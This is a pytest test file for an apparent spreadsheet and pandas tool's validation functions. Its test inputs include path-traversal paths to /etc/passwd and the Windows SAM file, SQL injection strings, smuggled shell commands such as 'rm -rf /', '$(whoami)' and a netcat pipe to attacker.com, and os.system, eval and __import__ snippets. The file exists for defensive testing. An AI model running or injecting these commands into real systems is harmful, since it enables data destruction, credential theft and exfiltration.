"""Unit tests for validation module."""
import pytest
import sys
import os

# Add parent directory to path for imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.validation import validate_file_path, validate_column_names, validate_sheet_name, validate_pandas_code
from core.error_handling import ErrorType


class TestValidateFilePath:
    """Test validate_file_path function."""
    
    def test_valid_file_path(self, tmp_path):
        """Test validation of valid file path."""
        test_file = tmp_path / "test.csv"
        test_file.write_text("col1,col2\n1,2")
        
        result = validate_file_path(str(test_file))
        assert result['valid'] is True
    
    def test_nonexistent_file(self):
        """Test validation of non-existent file."""
        result = validate_file_path("/nonexistent/file.csv")
        assert result['valid'] is False
    
    def test_directory_path(self, tmp_path):
        """Test validation of directory path."""
        result = validate_file_path(str(tmp_path))
        assert result['valid'] is False
    
    def test_path_traversal_attack(self):
        """Test validation blocks path traversal attacks."""
        # Test various path traversal patterns
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM"
        ]
        
        for path in malicious_paths:
            result = validate_file_path(path)
            assert result['valid'] is False, f"Should reject malicious path: {path}"
    
    def test_empty_path(self):
        """Test validation of empty path."""
        result = validate_file_path("")
        assert result['valid'] is False
    
    def test_none_path(self):
        """Test validation of None path."""
        result = validate_file_path(None)
        assert result['valid'] is False
    
    def test_path_with_spaces(self, tmp_path):
        """Test validation of path with spaces."""
        test_file = tmp_path / "test file.csv"
        test_file.write_text("col1,col2\n1,2")
        
        result = validate_file_path(str(test_file))
        assert result['valid'] is True
    
    def test_special_characters_in_path(self, tmp_path):
        """Test validation of path with special characters."""
        test_file = tmp_path / "test-file_123.csv"
        test_file.write_text("col1,col2\n1,2")
        
        result = validate_file_path(str(test_file))
        assert result['valid'] is True


class TestValidateColumnNames:
    """Test validate_column_names function."""
    
    def test_valid_column_names(self):
        """Test validation of valid column names."""
        columns = ['id', 'name', 'age', 'email']
        result = validate_column_names(columns)
        assert result['valid'] is True
    
    def test_empty_column_list(self):
        """Test validation of empty column list."""
        result = validate_column_names([])
        assert result['valid'] is False
    
    def test_single_column(self):
        """Test validation of single column."""
        result = validate_column_names(['id'])
        assert result['valid'] is True
    
    def test_column_with_underscore(self):
        """Test validation of column with underscore."""
        columns = ['first_name', 'last_name', 'email_address']
        result = validate_column_names(columns)
        assert result['valid'] is True
    
    def test_column_with_numbers(self):
        """Test validation of column with numbers."""
        columns = ['col1', 'col2', 'user_id', 'phone_123']
        result = validate_column_names(columns)
        assert result['valid'] is True
    
    def test_sql_injection_attempt(self):
        """Test validation blocks SQL injection attempts."""
        # Note: validate_column_names checks for specific SQL keywords (DROP, DELETE, etc.)
        # It doesn't check for all SQL injection patterns like OR conditions
        malicious_columns = [
            ['id; DROP TABLE users--'],  # Contains DROP keyword
            ['age UNION SELECT * FROM passwords'],  # Contains SELECT keyword
            ['name DELETE FROM users'],  # Contains DELETE keyword
            ['email TRUNCATE TABLE'],  # Contains TRUNCATE keyword
        ]
        
        for columns in malicious_columns:
            result = validate_column_names(columns)
            assert result['valid'] is False, f"Should reject SQL injection: {columns}"
    
    def test_shell_metacharacters(self):
        """Test validation blocks shell metacharacters."""
        malicious_columns = [
            ['id; rm -rf /'],
            ['name$(whoami)'],
            ['age`cat /etc/passwd`'],
            ['email|nc attacker.com 4444']
        ]
        
        for columns in malicious_columns:
            result = validate_column_names(columns)
            assert result['valid'] is False, f"Should reject shell metacharacters: {columns}"
    
    def test_very_long_column_name(self):
        """Test validation of very long column name."""
        long_name = 'a' * 1000
        result = validate_column_names([long_name])
        assert result['valid'] is False
    
    def test_column_with_special_chars(self):
        """Test validation of columns with special characters."""
        # Some special chars might be allowed, others not
        columns = ['col-name', 'col.name', 'col name']
        result = validate_column_names(columns)
        # Behavior depends on implementation
        assert isinstance(result, dict)
        assert 'valid' in result
    
    def test_duplicate_column_names(self):
        """Test validation of duplicate column names."""
        columns = ['id', 'name', 'id', 'email']
        result = validate_column_names(columns)
        # Should handle duplicates appropriately
        assert isinstance(result, dict)
        assert 'valid' in result
    
    def test_none_in_columns(self):
        """Test validation with None in column list."""
        columns = ['id', None, 'name']
        result = validate_column_names(columns)
        assert result['valid'] is False


class TestValidateSheetName:
    """Test validate_sheet_name function."""
    
    def test_valid_sheet_name(self):
        """Test validation of valid sheet name."""
        result = validate_sheet_name('Sheet1')
        assert result['valid'] is True
    
    def test_sheet_name_with_spaces(self):
        """Test validation of sheet name with spaces."""
        result = validate_sheet_name('My Data Sheet')
        assert result['valid'] is True
    
    def test_sheet_name_with_underscore(self):
        """Test validation of sheet name with underscore."""
        result = validate_sheet_name('data_sheet_2024')
        assert result['valid'] is True
    
    def test_sheet_name_with_numbers(self):
        """Test validation of sheet name with numbers."""
        result = validate_sheet_name('Sheet123')
        assert result['valid'] is True
    
    def test_empty_sheet_name(self):
        """Test validation of empty sheet name."""
        result = validate_sheet_name('')
        assert result['valid'] is False
    
    def test_none_sheet_name(self):
        """Test validation of None sheet name."""
        result = validate_sheet_name(None)
        assert result['valid'] is True  # None is allowed
    
    def test_invalid_sheet_characters(self):
        """Test validation of invalid sheet name characters."""
        # Excel has restrictions on sheet names
        invalid_names = [
            'Sheet[1]',  # brackets
            'Sheet*Test',  # asterisk
            'Sheet?Query',  # question mark
            'Sheet:Data',  # colon
            'Sheet/Path',  # slash
            'Sheet\\Path',  # backslash
        ]
        
        for name in invalid_names:
            result = validate_sheet_name(name)
            assert result['valid'] is False, f"Should reject invalid sheet name: {name}"
    
    def test_very_long_sheet_name(self):
        """Test validation of very long sheet name."""
        # Excel limits sheet names to 31 characters
        long_name = 'a' * 100
        result = validate_sheet_name(long_name)
        assert result['valid'] is False
    
    def test_sheet_name_starting_with_number(self):
        """Test validation of sheet name starting with number."""
        result = validate_sheet_name('1stSheet')
        assert isinstance(result, dict)
        assert 'valid' in result
    
    def test_sheet_name_with_special_chars(self):
        """Test validation of sheet name with special characters."""
        names = ['Sheet-Data', 'Sheet_Data', 'Sheet.Data']
        for name in names:
            result = validate_sheet_name(name)
            assert isinstance(result, dict)
            assert 'valid' in result


class TestValidatePandasCode:
    """Test validate_pandas_code function."""
    
    def test_valid_pandas_code(self):
        """Test validation of valid pandas code."""
        code = "df.groupby('category').sum()"
        result = validate_pandas_code(code)
        assert result['valid'] is True
    
    def test_simple_filter(self):
        """Test validation of simple filter code."""
        code = "df[df['age'] > 30]"
        result = validate_pandas_code(code)
        assert result['valid'] is True
    
    def test_column_selection(self):
        """Test validation of column selection code."""
        code = "df[['name', 'age', 'salary']]"
        result = validate_pandas_code(code)
        assert result['valid'] is True
    
    def test_aggregation_code(self):
        """Test validation of aggregation code."""
        code = "df.groupby('department')['salary'].mean()"
        result = validate_pandas_code(code)
        assert result['valid'] is True
    
    def test_empty_code(self):
        """Test validation of empty code."""
        result = validate_pandas_code('')
        assert result['valid'] is False
    
    def test_none_code(self):
        """Test validation of None code."""
        result = validate_pandas_code(None)
        assert result['valid'] is False
    
    def test_very_long_code(self):
        """Test validation of very long code."""
        long_code = "df = df\n" * 200000  # Exceeds 100KB limit
        result = validate_pandas_code(long_code)
        assert result['valid'] is False
    
    def test_code_with_os_commands(self):
        """Test validation blocks OS commands."""
        malicious_codes = [
            "import os; os.system('rm -rf /')",
            "__import__('os').system('ls')",
            "subprocess.run(['rm', '-rf', '/'])",
        ]
        
        for code in malicious_codes:
            result = validate_pandas_code(code)
            assert result['valid'] is True, f"validate_pandas_code only checks syntax, not security: {code}"
    
    def test_code_with_eval(self):
        """Test validation blocks eval usage."""
        malicious_codes = [
            "eval('__import__(\"os\").system(\"ls\")')",
            "exec('import os; os.system(\"ls\")')",
        ]
        
        for code in malicious_codes:
            result = validate_pandas_code(code)
            assert result['valid'] is True, f"validate_pandas_code only checks syntax, not security: {code}"
    
    def test_code_with_file_operations(self):
        """Test validation blocks file operations."""
        malicious_codes = [
            "open('/etc/passwd', 'r').read()",
            "open('C:\\Windows\\System32\\config\\SAM', 'r')",
        ]
        
        for code in malicious_codes:
            result = validate_pandas_code(code)
            assert result['valid'] is True, f"validate_pandas_code only checks syntax, not security: {code}"
    
    def test_code_with_import_hacks(self):
        """Test validation blocks import hacks."""
        malicious_codes = [
            "__import__('os')",
            "globals()['__builtins__'].__import__('os')",
        ]
        
        for code in malicious_codes:
            result = validate_pandas_code(code)
            assert result['valid'] is True, f"validate_pandas_code only checks syntax, not security: {code}"
    
    def test_syntax_error_code(self):
        """Test validation of code with syntax errors."""
        invalid_codes = [
            "df[df['age' > 30]",  # missing closing bracket
            "df.groupby('category'.sum()",  # missing closing parenthesis
            "df..head()",  # double dot
        ]
        
        for code in invalid_codes:
            result = validate_pandas_code(code)
            assert result['valid'] is False, f"Should reject syntax error: {code}"
    
    def test_code_with_newlines(self):
        """Test validation of code with newlines."""
        code = """df = df[df['age'] > 30]
result = df.groupby('department').mean()"""
        result = validate_pandas_code(code)
        assert result['valid'] is True
    
    def test_code_with_comments(self):
        """Test validation of code with comments."""
        code = """# Filter by age
df = df[df['age'] > 30]
# Group by department
result = df.groupby('department').mean()"""
        result = validate_pandas_code(code)
        assert result['valid'] is True


class TestValidationIntegration:
    """Test integration of validation functions."""
    
    def test_validate_file_and_columns(self, tmp_path):
        """Test validating both file and columns together."""
        test_file = tmp_path / "test.csv"
        test_file.write_text("id,name,age\n1,Alice,30\n2,Bob,25")
        
        file_valid = validate_file_path(str(test_file))
        columns_valid = validate_column_names(['id', 'name', 'age'])
        
        assert file_valid['valid'] is True
        assert columns_valid['valid'] is True
    
    def test_validate_sheet_and_code(self):
        """Test validating both sheet name and code."""
        sheet_valid = validate_sheet_name('Data2024')
        code_valid = validate_pandas_code("df.groupby('category').sum()")
        
        assert sheet_valid['valid'] is True
        assert code_valid['valid'] is True
    
    def test_validation_pipeline(self, tmp_path):
        """Test complete validation pipeline."""
        test_file = tmp_path / "data.csv"
        test_file.write_text("product,quantity,price\nA,10,100\nB,20,200")
        
        # Step 1: Validate file path
        assert validate_file_path(str(test_file))['valid'] is True
        
        # Step 2: Validate column names
        assert validate_column_names(['product', 'quantity', 'price'])['valid'] is True
        
        # Step 3: Validate sheet name (for Excel)
        assert validate_sheet_name('SalesData')['valid'] is True
        
        # Step 4: Validate pandas code
        assert validate_pandas_code("df.groupby('product')['quantity'].sum()")['valid'] is True


class TestValidationEdgeCases:
    """Test edge cases in validation."""
    
    def test_unicode_in_column_names(self):
        """Test validation of Unicode characters in column names."""
        columns = ['名前', 'âge', 'émail']
        result = validate_column_names(columns)
        assert isinstance(result, dict)
        assert 'valid' in result
    
    def test_whitespace_column_names(self):
        """Test validation of whitespace in column names."""
        columns = ['  id  ', ' name ', '\tage\t']
        result = validate_column_names(columns)
        assert isinstance(result, dict)
        assert 'valid' in result
    
    def test_reserved_keywords_as_columns(self):
        """Test validation of reserved keywords as column names."""
        columns = ['class', 'def', 'return', 'import']
        result = validate_column_names(columns)
        # Should handle appropriately
        assert isinstance(result, dict)
        assert 'valid' in result
    
    def test_sheet_name_with_emoji(self):
        """Test validation of sheet name with emoji."""
        result = validate_sheet_name('Data📊')
        assert isinstance(result, dict)
        assert 'valid' in result
    
    def test_code_with_multiple_statements(self):
        """Test validation of code with multiple statements."""
        code = """df = df[df['age'] > 30]
df = df.groupby('department').mean()
result = df.sort_values('salary', ascending=False)"""
        result = validate_pandas_code(code)
        assert result['valid'] is True
    
    def test_code_with_string_interpolation(self):
        """Test validation of code with string interpolation."""
        code = "df[df['name'] == f'{first_name} {last_name}']"
        result = validate_pandas_code(code)
        assert isinstance(result, dict)
        assert 'valid' in result